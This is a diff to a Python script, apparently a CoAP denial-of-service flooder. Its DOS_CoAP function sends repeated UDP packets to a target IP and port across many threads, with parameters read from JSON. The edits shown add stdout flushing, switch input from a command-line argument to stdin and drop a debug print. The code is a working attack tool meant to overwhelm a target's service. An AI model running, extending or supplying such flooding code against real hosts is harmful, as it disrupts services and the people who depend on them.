@@ -38,22 +38,25 @@ def DOS_CoAP(ip, port, times, threads, max_requests):
                 for x in range(times):
                     s.sendto(data, addr)
                 print(i + " Sent!!!")
+                sys.stdout.flush()
                 request_count += 1
             except:
                 print("[!] Error!!!")
+                sys.stdout.flush()
     
     for y in range(threads):
         th = threading.Thread(target=run)
         th.start()
 
 if __name__ == "__main__":
-    json_string = sys.argv[1]
+    json_string = sys.stdin.readline()
     # Xử lý chuỗi JSON thành đối tượng Python
     data = process_json_input(json_string)
 
-    print(data)
+
     if data:
         try:
             DOS_CoAP(data['ip'], data['port'], data['times'], data['threads'], data['max_requests'])
         except Exception as e:
             print("Error:", e)
+            sys.stdout.flush()
